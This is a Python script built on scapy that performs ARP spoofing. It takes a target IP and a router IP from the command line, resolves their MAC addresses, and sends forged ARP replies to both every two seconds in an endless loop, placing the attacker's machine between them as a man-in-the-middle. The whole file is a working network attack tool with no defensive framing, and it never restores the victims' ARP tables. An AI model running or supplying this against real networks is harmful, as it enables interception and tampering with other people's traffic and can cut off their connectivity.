#!/bin/python3
import scapy.all as scapy
import time
import argparse


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    answered_packets = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    mac = answered_packets[0][1].hwsrc
    return mac


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.sendp(packet, verbose=False)


def get_ip_address():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP of target device")
    parser.add_argument("-r", "--router", dest="router", help="IP of router")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify the IP of target. Use --help for more info")
    elif not options.router:
        parser.error("[-] Please specify the IP of router. Use --help for more info")
    return [options.target, options.router]


def run():
    target_ip, router_ip = get_ip_address()
    packets_sent_count = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        packets_sent_count += 2
        print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
        time.sleep(2)


run()